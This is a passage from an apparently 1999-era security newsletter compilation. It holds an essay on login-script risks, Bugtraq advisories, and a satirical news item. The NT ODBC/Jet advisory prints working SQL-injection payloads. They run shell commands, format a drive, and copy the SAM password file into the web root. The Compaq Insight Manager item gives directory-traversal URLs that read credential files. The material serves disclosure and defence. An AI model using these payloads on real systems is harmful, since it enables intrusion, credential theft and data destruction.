       copies of student/client data.  Worse, as most computers ship with no
       system-scale tape backup, very few students are able to back up their data. 
       This means that gigabytes of student data are protected only by the security built
       into their operating system.  This actually isn┤t too awful--no default remote
       access has its advantages--until the login scripts are compromised.  Since the
       login scripts reside on servers that in general are never considered fully secure by
       nature of the services they run, and which are further targeted due to the high
       value gained by a successful penetration, we see the heretofore impossible
       compromisation of every single networked Windows station nearly
       simultaneously as being only a matter of changing a few commands in a login
       script.  Crack one server, and you crack a thousand clients whose only "crime"
       was stating their identity.  That's one tough lesson.

       Sadly, some university administrators have responded to this observed threat by
       claiming that 1) they'd never maliciously enter anything into the login scripts and
       2) they're pretty much the only ones with access to the login scripts, so "nothing
       would ever happen." If there was ever a set of famous last words for a system
       administrator, these would be them.  They've got the keys to systems they don't
       own, and it's probable that their users don't even know it.  Their intentions are
       irrelevant; they're not generally the ones to worry about.  As I told one admin,
       "It's not you I distrust.  It's your computer.  Maybe you'll accidentally share the
       wrong directory.  Maybe you┤ll be forwarded to a web site that will use a
       backdoor to initiate a remote LANMAN authentication.  Perhaps a 95/98
       machine you logged into as Administrator for the domain will have its .PWL files
       cracked.  Or maybe somebody will sneak in in the middle of the night and install
       a keylogger.  With one hack providing access to *everybody*'s machine, it's
       worth it for a cracker to attack; isn't it worth it for you to defend?"
        

                                                               
       If this is making sysadmins in the corporate sector nervous...it should.  Yes, the
       downside to centralized management is indeed single point of massive failure. 
       More than ever, businesses are just one disgruntled system adminstrator away
       from a task-scheduled mass virus infection--or worse.  While indeed there are
       methods for disabling the loading of login scripts, their all-or-nothing nature
       makes them unrealistic in many environments.  Businesses should not need to
       choose between tremendous risk and necessary functionality.  Microsoft and
       Novell need to implement the following functionality in their login script code:

       1)  Script Capabiltiies.  Login scripts allow drives to be mounted, printers to be
       connected, applications to be loaded from remote drives, and so on.  System
       administrators need the ability to specify exactly which commands a client
       machine should honor.  This provides a barrier to abuse--a site that only uses
       login scripts to mount network drives should be able to restrict clients to the
       degree of functionality the site requires.  There are going to be issues, of course,
       with executable code on remote drives.  To address this, we require...

       2)  Data Signatures.  Cryptographic signatures on executable content, most
       commonly used by Microsoft's Authenticode system, provide a means for
       insecure systems to verify the appropriateness of remotely executed code. 
       Sysadmins should be able to "sign" login scripts, as well as commonly executed
       remote code, and then specify that unless the client detects a signature from a
       "trusted" list, the content should be considered unauthorized.  Sysadmins should
       also be able to sign actual executables(and maybe even data files) as acceptable
       for remote execution.

       3)  Executable hash checking.  A slightly different tact might be to have clients
       cache hash values of specific files commonly run.  Given a change from one
       session to another in the file hash, a trap could be sent to the administrator noting
       him or her that a system breach may have occurred.  It┤s one thing to replace the
       contents of a file, but it┤s another to have to operate against the memory of every
       client that accessed the old file.  This is a useful way to flip the disadvantage of
       large numbers of dumb machines into an advantage of intelligent agents with
       configurable responses to non-matching hashes.

       Of course, the ultimate solution to this issue is to emulate a an alternate login
       paradigm that Win95/98 implements to some degree.  As Russ Cooper, editor
       of NTBugTraq, writes:

       There is *no need* for a client machine (be it Win9x or NT) to logon in to a domain in
       a way that would invoke a login script in order to gain access to its resources. You
       log into the machine itself (the client machine), and then connect to the resource
       and supply a userID and password. This will establish the connection, without
       invoking the login script. Bingo, problem solved, no?

       Novell and many other systems need to emulate this usage paradigm post-haste,
       and institutions still using full Domain logins must cease as soon as possible.
        

                                                               
       Universities should consider implementing systems that do not require any form
       of login procedure for the user to access his or her own computer.  The
       reasoning for this is a matter of ownership--what right does a university have to
       deny a user access to his or her own computer?  Password security is
       notoriously bad anyway, and is far too insecure for any degree of
       non-repudiability.  I┤m working on a solution for switched hubs involving using
       MAC Caches to allow trustable two-way communication traces.

       Those who insist upon using login procedures need to be disable them
       immediately for dorm-room computers.  Students who need to connect to
       specific shares should be given a batch script to load--this will, incidentally,
       eliminate nasty situations where login scripts appropriate for one
       environment(say, the capturing of LPT1 to a printer port) are completely
       inappropriate in another(say, when that same user is in their dorm room).

       For those administrators running Novell Netware all the way to your student┤s
       desktop, I implore you to evaluate DoxPrint.  DoxPrint allows sysadmins to
       enjoy most of the advantages of running Netware servers on the backend while
       sparing Windows clients the hardship of installing and maintaining the Novell
       client code.  All access occurs over the Network Neighborhood, and is quite
       flexible in its programmability and authentication.  It┤s been tested and proven as
       a powerful solution to some of the problems Netware creates.

                                                               
       It┤s a strange thing, that such a common function would turn out so open for
       abuse.  System designers who create new functionality need to include security
       considerations at every phase of the design process.  Any time network access
       to a system is introduced, there is a significant burden of functionality upon
       the system to verify that the actions executed on behalf of the remote agent
       are appropriate.  Failure to meet this burden is technical irresponsibility and
       must be prevented at all costs.

       I am immensely curious as to the reactions of Microsoft, Novell, and any other
       administrator who is reading this now.  Please, send me your opinions; I┤ll
       publish the best of the replies.

 50.0 Vulnerability in pop2.imap
      ~~~~~~~~~~~~~~~~~~~~~~~~~~
      
      Date: Wed, 26 May 1999 20:37:13 +0100
      From: Chris Evans &lt;chris@FERRET.LMH.OX.AC.UK>
      To: BUGTRAQ@netspace.org
      Subject: Remote vulnerability in pop2d
      
      Hi
      
      Firstly, sorry if any details are hazy - this is from memory (it's two
      months since I last looked at this). This bug concerns the pop-2 daemon,
      which is a part of the Washington University imap package.
      
      I've been waiting for a CERT advisory, but one doesn't seem to be
      forthcoming. Two and a half months is a long time. Also, the problem has
      been fixed for a long time. I'm posting because
      
      a) A fixed full release is available, so people should know about it
      b) The flaw is fairly basic and easy to spot, so active exploitation could
      well be happening
      
      Quick details
      =============
      
      Compromise possible:  remote users can get a shell as user "nobody"
      If:                   runing pop-2d v4.4 or earlier
      
      Fixed version:        imap-4.5, available now.
      
      
      Not vulnerable
      ==============
      RedHat-6.0 isn't vulnerable because imap-4.5 was shipped.
      
      Vulnerable
      ==========
      
      Anyone who shipped the pop-2 component of imap-4.4 or earlier, including
      earlier RedHat releases
      
      
      Details of flaw
      ===============
      
      pop-2 and pop-3 support the concept of an "anonymous proxy" whereby remote
      users can connect and open an imap mailbox on _any server they have a
      valid account on_. An attacker connects to the vulnerable pop-2 port and
      connects it to an imap server under their control. Once logged on, issuing
      a "FOLD" command with a long arg will cause an overflow of a stack based
      buffer.
      
      The arg to FOLD must be somewhere around 1000 bytes - not much bigger, not
      much smaller. Look at the source.
      
      Additional
      ==========
      
      I think the concept of "anonymous proxy" is just fundamentally insecure.
      It opens up a large code path for remote usrs to explore, i.e. the
      protocol parsing of imap, etc.
      
      The author of imap very responsibly includes a compile time flag to
      disable this in 4.5.
      
      Better still, RedHat-6.0 ships with the proxy disabled.
      
      
      Cheers
      Chris

      =====================================
      
      Vulnerability Summary
      ---------------------
      
      Problem:  The web server included in Compaq Insight
                     Manager could expose sensitive information.
      
      Threat:   Anyone that have access to port 2301 where
                     Compaq Insight Manager is installed could get
                     unrestricted access to the servers disk through
                     the "root dot dot" bug.
      
      Platform: Detected on Windows NT and Novell Netware servers
                     running on Compaq hardware.
      
      Solution: Disable the Compaq Insight Manager web server or
                     restrict anonymous access.
      
      
      Vulnerability Description
      -------------------------
      When installing Compaq Insight Manager a web server gets installed. This web
      server runs on port 2301 and is vulnerable to the old "root dot dot" bug. This
      bug gives unrestricted access to the vulnerable server?s disk. It could easily
      get exploited with one of the URLs:
      
      http://vulnerable-NT.com:2301/../../../winnt/repair/sam._
      http://vulnerable-Netware.com:2301/../../../system/ldremote.ncf
      
      (How many dots there should be is install-dependent)
      
      
      Solution
      --------
      You could probably fix the problem by restricting anonymous access to the Compaq
      Insight Manager web server. If you are not using the web server, Infosec
      recommends disabling the service.
      
      
      Background
      ----------
      Infosec gives the credits to Master Dogen who first reported the problem
      (Windows NT and Compaq Insight Manager) to us and wanted us go public with a
      vulnerability report.
      
      Infosec have found that Novell Netware with Compaq Insight Manager have the same
      problem but is not as common as on Windows NT.
      
      Compaq Sweden was informed about this problem april 26, 1999.

      Yesterday while I was removing the "web insight agent" service from the our
      vulnerable NT servers, I noticed on some machines that port 2301 was still
      vulnerable. To completely remove the problem, make sure you also stop the
      "surveryor" service as well if you have that installed. That will
      completely shut off access to port 2301 and plug the hole.

 52.0 Advisory: NT ODBC Remote Compromise
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

      --[ Advisory: NT ODBC Remote Compromise
      
      --[ By Matthew Astley      [RCPS]        http://www.fruitcake.demon.co.uk
      --[  & Rain Forest Puppy   [WireTrip]    rfp@wiretrip.net
      
      --[ Brief Summary
      
      MS Jet database engine (which runs Access databases) allows an individual
      to embed VBA in string expressions, which may allow the individual to run
      commandline NT commands.  This, combined with the flaw of IIS running ODBC
      commands as system_local allow a remote attacker to have full control of
      the system.  Other webservers may be affected.  Many MS Jet engines are
      affected, but may not lead to elevated priviledges.
      
      --[ Background
      
      ODBC allows a program flexible access to one or more relational databases
      using SQL. If a client fails to quote correctly the meta characters in a
      piece of data used in an SQL query, an attacker may be able to interfere
      with the tables in the database (see MS SQL appension 'feature' in Phrack
      54, article 8).
      
      However, the Microsoft "Jet" database engine (aka MS Access) provides some
      extensions to SQL which allow the execution of VBA (Visual Basic for
      Applications). This makes holes in meta character quoting code much more
      interesting and dangerous.
      
      --[ What form does the hole take?
      
      In SQL, strings must be enclosed in single quotes. If a string includes a
      single quote it must be escaped by doubling it up.
      
      The Jet engine extends this by allowing strings to enclose a VBA
      expression inside vertical bar characters in the string, like this:
      
              select 'lil'' string | 6+7 | with number' as foo from table;
      
      This will produce a recordset containing one field with the value "lil'
      string 13 with number" for each row of the input table. Innocent enough,
      if the CGI or ASP programs correctly quote the incoming data.
      
      However, since the pipe operator is a rather obscure character and is very
      poorly documented, most people don't know it's there - apparently even
      Microsoft programmers.
      
      --[ It's a feature, not a bug!
      
      Note the following excerpt from a MS Knowledge Base article:
      (http://support.microsoft.com/support/kb/articles/q147/6/87.asp)
      
      Pipe Character or Vertical Bar
      
        The pipe character or vertical bar is a reserved character for the Jet
      database engine. It tells the Jet database engine to evaluate the
      identifier before evaluating the rest of the expression. Therefore, the
      Jet database engine inserts the value of the identifier in the expression,
      and then evaluates it.
      
        Vertical bars are used most often in domain aggregate functions when you
      want the function to automatically recalculate the value it returns in
      filters. Or vertical bars are used as an alternative to the ampersand (&)
      operator when you concatenate text values. Because of this, you cannot
      embed the vertical bar (|) in a literal string, you must embed the Chr()
      function. Chr(124) is the vertical bar.
      
      --[ Where does it apply?
      
      Any textual data included in a Jet SQL query can contain quoted VBA,
      whether it is in data to be inserted in a new record or part of a
      condition expression. This makes the hole very general (or flexible, if
      you prefer), since you don't need to know the context in which the string
      will be evaluated.
      
      --[ What commands are available?
      
      The biggest restriction is that the code must be evaluated in an
      expression context - no statements.
      
      Anything listed as "VBA" in the "Functions Reference" page of the Access
      Help file will work, although this seems to vary between versions of the
      Jet engine - for example, in some cases the "eval" function works and in
      others it doesn't (although when it is available, eval doesn't actually
      help much because the |...| operator offers a similar if not identical
      context).
      
      The most useful command is "shell", although this in itself cannot do
      redirections or pipes - cmd.exe can assist with this though.  By using the
      shell function and running cmd.exe, an attacker can run any command on the
      system.
      
      environ() can also be useful to get environment variables values into your
      commands, and chr() can be very handy for quoting awkward characters using
      alphanumerics and brackets. There are also the standard functions like
      iif() and various string operations (use "&" for concatenation).
      
      It would be very difficult to include any kind of loop in the VBA fragment
      because loops do not have return values.
      
      --[ Which characters need quoting, and how?
      
      If the exploit string will be passing through anything that tries to
      escape special characters then ' will be double up - best to use "
      instead.
      
      Ironically, the vertical bar character can only be escaped by using it to
      evaluate the chr(124) function.
      
      VBA will take pairs of double-quotes (") in a VBA string constant the same
      way SQL will take pairs of single-quotes. If this doesn't seem to work you
      can always use chr(34).
      
      ASP also provides a convenient debugging aid - if the expression cannot be
      correctly evaluated the error message will often include the whole SQL
      query with the partially decoded exploit string in it--this could help an
      attacker 'tweak' the exploit string until it works.
      
      If the command needs to be broken up with newlines, they can be inserted
      between VBA operators inside the |...| construction.
      
      --[ How about a practical example?
      
      An example of a pipeline:
      
              |shell("cmd /c echo " & chr(124) & " format a:")|
      
      will format whatever is in the floppy drive at the time. Any errors will
      be silently ignored, although an iconised window will take the focus for
      the duration of the command.
      
      Using "cmd /c" allows the command piping necessary to get a newline into
      the format command, otherwise the pipe and 'format' are passed as
      arguments to 'echo'.
      
      This string can be included in anything from a simple ODBC operation to a
      text item in an ASP form on a web page. The function will normally
      evaluate to a two or three digit number.
      
      A more sophie's-stick-ate-it example involves grabbing a copy of the SAM:
      
              |shell("cmd /c rdisk /S-")|
              |shell("cmd /c copy c:\winnt\repair\sam._ c:\inetput\wwwroot")|
      
              ** this example includes assumptions about the location of the
              ** system and www publishing directory; it's only an example
      
      Commands can be stacked:
      
              |shell("cmd /c echo 1 > %temp%\foo.txt") & shell("cmd /c echo 2 \
              >> %temp%\foo.txt") & shell("cmd /c echo 3 >> %temp%\foo.txt")|
      
              ** line broken for clarity
      
      It is not clear that the commands will always be executed in order. Each
      shell command executes asynchronously so the code above has two races for
      whether the shell commands finish updating the file before the next one
      starts - results will be variable.
      
      --[ Could an attacker modify registry keys?
      
      Ultimately the hole allows anything since you can up/download and run any
      code, but modifying registry keys from VBA seems to be a little tricky.
      
      The method using advapi32.dll won't work because it requires statements to
      declare functions from the library, but there doesn't seem to be a way of
      giving a statement a return value in VBA.
      
      It would be easier to create a temporary .reg file and then merge it with
      "cmd /c regedit /s %temp%\tmp.reg"; the '/s' is important, as it
      suppresses the informational dialogs/windows.
      
      --[ What permissions will an attacker have?
      
      The dangerous part comes from a context misinterpretation with IIS.  IIS
      runs as system_local; it changes its token context (typically to IUSR_xxx)
      for filesystem access and application execution.  However, the context
      does *NOT* change when interfacing with the ODBC API.  Therefore all ODBC
      functions (and the associated database calls) are happening under
      system_local.  This allows full access to the system.
      
      --[ Theory of exploitation
      
      This problem can be used over the web against scripts that make queries
      against local MS Jet ODBC DSNs, therefore, any script or application that
      uses a MS Jet ODBC DSN could potentially be exploited.  The solution is to
      not use MS Jet ODBC drivers for any DSN--until Microsoft releases a fix.
      But since this is a documented feature, there stands a chance that some
      applications may break if removed.
      
      --[ Reality of exploitation
      
      Ok, so let's get down to some nitty-gritty, real-life examples.  We'll
      give a few that just demonstrate the problem....but since any
      script/application that gives user entered strings to the MS Jet ODBC DSN
      are vulnerable, we're not going to laundry-list them; rather, we'll show
      some of the more common cases we found.
      
      --[ Importance of the DSN
      
      Just some really quick background on ODBC & DSNs: an application
      'connects' to the ODBC service specifying a specific DSN to query to.  The
      DSNs are defined in the ODBC32 applet of the control panel.  Each DSN is
      basically a description of the name of the DSN, the drivers to use (in our
      case, the MS Jet/Access drivers), and location of the actual database (a
      .mdb file somewhere in the filesystem).  We could also have DSNs that used
      drivers such as Oracle or MS Sql, and the location would be another
      server.  The whole point is that you only need to know the DSN name--ODBC
      will take care of where and how the actual database is to be used.
      
      So, great, these scripts query a DSN by name.  Well, there are times were
      a server can have the scripts we mention, but when ran, you get an error
      saying DSN is not found.  So now what?  Well, if it's an IIS server, check
      for the existance of /scripts/tools/newdsn.exe.  Yes, IIS includes CGI
      appliations *to make DSNs*.  If the server doesn't have the DSN we need,
      we can just make it for them.  We only need newdsn.exe, but it's possible
      to use a 'GUI' through getdrvrs.exe and dsnform.exe.  Here's a flowchart:
      
              http://server/scripts/tools/getdrvrs.exe
              -> pick Microsoft Access Driver (*.mdb)
              -> Enter in the correct DSN name
              -> Enter a location for the .mdb, example: c:\web.mdb
              -> Submit
      
      This will create the DSN.  If you want to be ultra-elite and do it the
      hard way, you can pass all the parameters to newdsn.exe like so:
      
              http://server/scripts/tools/newdsn.exe?driver=Microsoft%2B
              Access%2BDriver%2B%28*.mdb%29&dsn=DSN_name&dbq=c:\web.mdb&
              newdb=CREATE_DB&attr=
      
              **all one line, no spaces
      
      Where dsn is the name you want, and dbq is the file location.  So for all
      the examples, we'll include the DSN name, just in case you have to create
      it.
      
      --[ IIS Sample Applications
      
      According to Russ Cooper of NTBugtraq, sample application problems are
      stupid and we shouldn't waste our time talking about them.  He's already
      denied posts from myself, David Litchfield, and others.  So, if you lived
      in Russ's little world, you won't have any of the following sample apps
      installed on your server, so you should just stop reading this article
      right now.  But for those of you who realize it's just not that simple,
      perhaps you can learn something here.  Also note this goes beyond sample
      scripts--they're just being used as a command reference example.
      
      Anyways, a good example script is
      
              http://server/scripts/samples/details.idc?Fname=&Lname=
      
      stick your shellcode in for either Fname or Lname, like so:
      
              details.idc?Fname=hi&Lname=|shell("cmd+/c+dir")|
      
      This uses DSN named "Web SQL" (notice the space).  However, this causes
      problems, because the actual table must be initialized in the DSN.  Never
      pheer, scripts are here!  Run
      
              http://server/scripts/samples/ctguestb.idc
      
      after you create the DSN (if you had to) and before you run details.idc
      
      --[ MSADC (IIS 4.0)
      
      Starting with IIS 4.0, Microsoft bundled a way to do remote SQL queries on
      a DSN simply by interfacting via HTTP to a specific .dll.  Bug?  Hole?
      Nope, in the documentation Microsoft states that having MSADC installed
      could lead to security problems.
      
      The particular .dll is at
      
              http://server/msadc/msadcs.dll
      
      Now the particular problem is that there's a slightly custom way to
      interface to the .dll, using multipart-forms.  So it's beyond the scope of
      just typing in a paramter by hand.  So there's two options.
      
      One is to see if the server also has the (optional) interface installed.
      Check out for the existance of
      
              http://server/msadc/samples/adctest.asp
              
              ** Note: you have to use Internet Explorer 4.0+ for this
      
      This will give you a Java/Javascript interface that allows you to specify
      the DSN, uid/password, and SQL string to execute.  Note that you'll have
      to obtain the table structure for the DSNs mentioned herein, because
      you'll need to construct a valid SQL statement.
      
      The other option is to obtain those files yourself from another server, or
      download and install the MS RDS/ADO/ADC components.  Look at
      
              http://www.microsoft.com/data/ado/
      
      for more info and where to download.
      
      ** One note is that the Java interface lets you specify which server to
      use.  So you can open the interface locally, off your own server, or find
      it on server 1, and specify to run SQL commands against whatever DSN on
      server 2.
      
      The one caveat is that error information is not displayed.  It helps to
      have a sniffer going to see if what ODBC error messages are returned, if
      any.  If you don't get a record listing, you might want to see what the
      error was.
      
      Now, what to do?
      
      You can obviously just execute SQL commands that contain the pipe
      character.  For instance:
      
              Connection: DSN=AdvWorks
              Query: Select * from Products where ProductType='|shell("")|'
      
              ** Insert your shellcode in the shell() function
      
      --[ Sign-Off
      
      Well, I'm sure that's enough to chew for a bit.  Sorry, the examples
      weren't as in-depth as usual--you'll just have to be satisfied with
      theory. :)

      Do keep in mind that while this will stop people from using the
      aforementioned exploits *only when using your forms*.  It is still
      possible to download your web pages, remove the javascript hooks, and then
      submit their information, or call the CGI(if method GET is accepted) by
      hand and get around such security measures.

      Subject: Re: Advisory: NT ODBC Remote Compromise
      
      Hello
      
      I have run some testing. Seems to me that this error has been repaired in
      MSJET40, but exists in MSJET35. Effectively, if Jet 4 is installed (and it's
      used by ODBC) ther's no problem with .IDC files. If one does not have Jet 4
      and is using .IDC to open Jet databases (I have not verified this) I belive
      this is dangerous situation, described by Matthew Astley.
      
      Because MS Access 97 is using Jet 3.5 (even if Jet 4 is installed), the
      problem still can be seen there.
      
      If instead of .IDC (which is considered obsolete) one is using .ASP + ADODB,
      and ADODB provider used is "Microsoft.Jet.OLEDB.3.51"  (i.e. older than
      "4.0") then problem still exists.
      
      It's worthy to notice that SQL implementation used in both Jet 4 and Jet 3.5
      is little different. Thus applications (in some situations) cannot be simple
      ported from one to another. One thing I found is different handling of
      single- and double-qoute character. MS still have not documented differences
      (or I had no luck to find it). AFAIK MS Jet 4 comes with  Microsoft Data
      Access 2.1 (MSDAC21).
      
      Details:
      
      System: WinNT Wrkst 4 US, SP5 , IE5 , IIS 4 (Option Pack), ODBC MS Access
      Driver 4.00.3513.00, other (cursor library, administrator etc.) ODBC files
      3.510.3711.0
      Database: Access 97, Jet 3.51.2026.0 (I have also Jet 4.00.2115.25
      installed, but Access 97 uses older version)
      Table "guests" as described in Web SQL.
      Query "SecurityTest" as bellow:
        SELECT FirstName, LastName FROM Guests WHERE LastName =
      '|Shell("notepad.exe",1)|';
      
      What happens:
      - If I open the query under MS Access, it opens Notepad app and shows the
      (empty) resultset. So far mentioned SQL "feature" works.
      
      - If I use MSQRY32.EXE to open the database (), nothing more happen than
      showing the resultset (empty one).  The same if I run SQRY32 from within MS
      Excel ("Get Externala Data")
      
      - I created TEST.IDC file as bellow (and TEST.HTX, of course):
      Datasource: Web SQL
      Username: sa
      Template: details.htx
      SQLStatement:
      +SELECT FirstName, LastName
      +FROM SecurityTest
      and opened it through HTTP. The only result is an empty resultset. I checked
      list of processes (using TLIST.EXE) and notepad was not run.
      
      - I created TEST2.IDC file as bellow:
      Datasource: Web SQL
      Username: sa
      Template: details.htx
      SQLStatement:
      +SELECT FirstName, LastName
      +FROM Guests
      +WHERE LastName <> '|Shell("notepad.exe",1)|'
      the same. Notepad did not run.
      
      - I created very simple .ASP
      &lt;HTML>
      &lt;HEAD>
      <%
      Param = Request.QueryString("Param")
      Data = Request.QueryString("Data")
      %>
      &lt;/HEAD>
      
      &lt;BODY>
      <%
      Set Conn1 = CreateObject("ADODB.Connection")
      'strConn = "Provider=Microsoft.Jet.OLEDB.3.51;Data
      Source=c:\temp\test.mdb;Mode=Read"
      strConn = "Provider=Microsoft.Jet.OLEDB.4.0;Data
      Source=c:\temp\test.mdb;Mode=Read"
      strSQL = "SELECT FirstName , LastName FROM SecurityTest"
      
      Conn1.Open strConn
      Set RSet1 = Conn1.Execute(strSQL)
      RSet1.Close
      Conn1.Close
      %>
      &lt;/BODY>
      &lt;/HTML>
      Notice that there are 2 connection strings, one is used and the other
      commented out. Upper connection string ("Provider=Microsoft.Jet.OLEDB.3.51")
      is UNSAFE. When I opened .ASP it started NOTEPAD.EXE in the context of  WWW
      server. If WWW client can type-in any literal into HTML form, pass it to
      .ASP application (for exaple to be used in "WHERE" clause) and it remains
      non-parsed, then he/she will be able to run ANY code in the context of
      LocalSystem. If such a WWW server is also domain controller ... well, I'm
      bit scared to think about. Lower connection string
      ("Provider=Microsoft.Jet.OLEDB.4.0") seems to be safe.
      
      I hope somebody can verify my tests. Most important point is that while .IDC
      files are using current ODBC it strongly depends on configuration of the
      system. If Jet 4 is installed and is used by ODBC, we are safe. The same
      applies to .ASP + ODBC. On the other side is .ASP + ADODB, where Jet engine
      can be explicitly selected. If Jet older than 4 is used then we have
      dangerous situation. Fortunately in .ASP we can easily parse strings passed
      >from WWW client (like Vittal Aithal did in JavaScript, but function will be
      run on the server side).

      :
      : --[ Brief Summary
      :
      : MS Jet database engine (which runs Access databases) allows an individual
      : to embed VBA in string expressions, which may allow the individual to run
      : commandline NT commands.  This, combined with the flaw of IIS running ODBC
      : commands as system_local allow a remote attacker to have full control of
      : the system.  Other webservers may be affected.  Many MS Jet engines are
      : affected, but may not lead to elevated priviledges.
      
      Here's something that does not work for me. ODBC is not using Jet "feature"
      run embed VBA expression. It seems to use different database engine.
      
      : --[ Background
      :
      : ODBC allows a program flexible access to one or more relational databases
      : using SQL. If a client fails to quote correctly the meta characters in a
      : piece of data used in an SQL query, an attacker may be able to interfere
      : with the tables in the database (see MS SQL appension 'feature' in Phrack
      : 54, article 8).
      
      That's true, but not connected to the subject. Attacker seems not to use
      Jet, while "feature" exists just there. At least on my system.
      
      : However, the Microsoft "Jet" database engine (aka MS Access) provides some
      : extensions to SQL which allow the execution of VBA (Visual Basic for
      : Applications). This makes holes in meta character quoting code much more
      : interesting and dangerous.
      
      That's true.

      I've had 2 individuals suggest that MDAC 2.1 solves the problems
      described by rfp@wiretrip.net regarding NT ODBC and Access. There is
      also another message on Bugtraq suggesting the same thing.
      
      Daryl Banttari [daryl@windsorcs.com] reports that Allaire's ColdFusion
      product is vulnerable to the same attack when using Access datasources,
      but appears not to be vulnerable after installing MDAC 2.1.
      
      I could put a direct link here to MDAC 2.1, but the fact is that you
      should not simply upgrade to it without understanding what it changes
      (and what effect those changes may have on your existing environment).
      So instead, I give you;
      
      http://www.microsoft.com/data/MDAC21info/MDAC21GAmanifest.htm
      
      which has a ton of information about the MDAC 2.1 release.

      If you are using Excel data sources and are updating data in them you will
      want to keep in mind that upgrading to MDAC 2.1 will break those data
      sources. MDAC 2.1 no longer supports the update method for Excel data
      sources. This will, for example, cause Cold Fusion to access violate, and
      often causes crashes in InetSrv.exe if you are using IIS. Unfortunately, MS
      forgot to mention that in the document Russ pointed to.

      Advisory: Buffer overflow in SmartDesk WebSuite v2.1
      Platforms Affected: Windows NT, Windows 98

      Date: 5/23/99
      
      Description:
      ----------- 
      WebSuite v2.1 will crash when an additional 250+ characters
      is appended after the sites URL on NT Server 4 and NT 
      Workstation 4 boxes.
      
      Running on top of Windows 98 it will crash with 150+ characters 
      appended after the sites URL. 
      
      After reinstallating on both platforms several times, the
      overflow string length varied.  Approximately 1 out of 8 times
      the overflow string went from 150 chars (Win98) to about
      1000+ chars.  It also went from 250+ chars (NT) to about
      2000+ chars.
      
      After the server crashes on NT Workstation 4, it's unable

 54.0 Security Leak with IBM Netfinity Remote Control Software

      On May 10th, 1999, Thomas Krug reported to NTBugtraq;
      
      >Hi,

      >Thomas
      
      After an incredibly difficult journey through the labyrinth of IBM's
      support groups, I finally spoke to a Ted McDaniels who, reportedly, was
      responsible for support of the IBM Netfinity RCS.
      
      After explaining Tom's issues with the product, Ted acknowledged that
      IBM Netfinity RCS was "built with very little security in mind". He also
      expressed doubt that any "fix" might be made to it to give it even the
      most rudimentary NT security understandings.
      
      IBM did promise to send some sort of explanation to NTBugtraq regarding
      Thomas' findings, however, Ted has now gone on vacation and we're left
      with nothing from them.
      
      Can you detect how disappointed I am with IBM's reaction and handling of
      this issue?
      
      Thomas' company was in the process of ripping out IBM Netfinity RCS when
      he originally submitted the issue, and all indications are that anyone
      using IBM Netfinity RCS, or considering using it, should do the same.
      
      Bottom line, there is no way to control what a user can or cannot do
      with the "Process Manager" component of IBM Netfinity RCS, and clearly
      they are able to usurp all other controls you might have placed on your
      NT environment should the product be present. The service *must* be run
      as either SYSTEM or ADMINISTRATOR.
      
      If anyone has found a way to avoid the *HUGE SECURITY HOLE* this product
      creates in an NT environment, please let us know.

 55.0 IBM eNetwork Firewall for AIX
      ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 
      Date: Tue, 25 May 1999 20:33:53 +0100
      From: Paul Cammidge &lt;paul@PCCC.CO.ZA>
      To: BUGTRAQ@netspace.org
      Subject: IBM eNetwork Firewall for AIX
      
      The IBM eNetwork Firewall for AIX contains some poorly written scripts,
      which create temporary files in /tmp without making any attempt to
      validate the existance of the file.  This allows any user with shell
      access to such a firewall to corrupt or possibly modify system files by
      creating links, pipes, etc with the same name.
      
      In a simple example submitted to IBM, /etc/passwd was overwritten.  This
      example has been published on one of their support web pages as a 'local
      fix'.
      
      The problem was reported to IBM early in January.  To the best of my
      knowledge, the correct procedures have been followed.  Initially, IBM
      responded by telling me that it was common practice for software to make
      use of /tmp.  They suggested changing the permissions to prevent users
      >from creating symbolic links to sensitive files.
      
      An APAR (IR39562) was opened on 18/01/99 and closed on 13/03/99.  The
      fix has not yet been released.  This definately applies to version 3.2,
      and probably others.
      
      Anyone running this software and has users with shell accounts should be
      aware that the potential exists for these users to corrupt files which
      they dont have access to.

      your are right, all their scripts have got link vulnerabilities ...

      when I found these in an audit at a customer in february, I opened an APAR
      too, but then discovered yours. When I saw that yours was opened a month
      before mine and not being dealt with, I made noise at IBM management and
      the AIX Security Team, that they issued an emergency fix.
      But this fix only available for those who know that it exists - anyway, the
      quick fix still has /tmp races all over the place - they just added "rm -f
      file" the line before writing into it ....
      
      > An APAR (IR39562) was opened on 18/01/99 and closed on 13/03/99.  The

      I heard that the next IBM Firewall version will fix this ... bah - maybe
      with that quick "fix" ...
      
      But to set one thing straight: It's *not* IBM's fault. The IBM Firewall is a
      product of another company called Raleigh (I hope thats spelled correctly).
      In fact, the IBM AIX Security Team, especially Troy Bollinger, was very
      helpful and getting a fix - a correct one - out. It's the other company
      who writes security software but really seems to have no knowledge.
      sad but true

      NATO authorizes airstrikes on hackers
      
      Silicon Valley, California -- Chat rooms were unusually deserted, spammers went on panicked last-minute
      mail-bombing sprees and bomb shelters filled to overflowing today as gloom engulfed hackers waiting for
      NATO strikes.
      
      Hackers showed a mix of fear and defiance toward the Western military alliance, aware it could strike at any
      moment against strategic hacker targets after yet another embarrassing vandalism of a U.S. Department of
      Defense website.
      
      "This waiting for strikes is killing me," said w4r3z_f14r3, a 22-year-old student in the controversial Computer
      Science department at the Massachusetts Institute of Technology. "If they want to bomb us, they should do it
      now so I can get back to cracking Afterlife II."
      
      Graphics illegally uploaded to an Associated Press website accompanied a note which stated, "F1n1$h 7h1Z
      60mb1n9 0r f4c3 my uur47h, I 4m l337!!! H4x0rs un173!" The web server was quickly downed in a flurry of
      flamewars over the proper use of the word 'hacker' versus 'cracker' in the page.
      
      Many college-age hackers stayed home rather than attending school, though most admit they would have
      stayed home anyway.
      
      Y2K websites issued detailed FAQs to threatened hackers in case of bombing, including information on how
      long canned goods stay fresh in underground shelters, how to fix a misfiring diesel generator, and how to sow
      grain in the field with a plow and oxen.
      
      Bomb shelters, unused in emergency since DefCon 4, were cleaned up during the last NATO threat in August,
      when the alliance previously announced its intention to launch airstrikes at the notorious hacker group Cult of
      the Dead Cow. Most shelters have been turned into underground bunkers featuring ISDN lines with
      triple-redundancy backups, as once the hackers moved in, they found the absence of sunlight and social
      involvement enjoyable.
      
      Despite the danger, supporters of hard-line hackers were defiant.
      
      "NATOns will fire their missiles from a distance," said Lord Kreel, an NT cracker. "Meanwhile, I will be
      cracking into the Pentagon with my friends in the Lackeys of Terror. We plan to install Windows on all of their
      computers, which will cripple their systems beyond repair."
      
      Opponents of "black hat" hacking think NATO strikes will actually increase the popularity of cracking among
      the techno-elite, but cement the popular image of the hacker as a no-good techie pirate bent on stealing credit
      card numbers and eating babies.
      
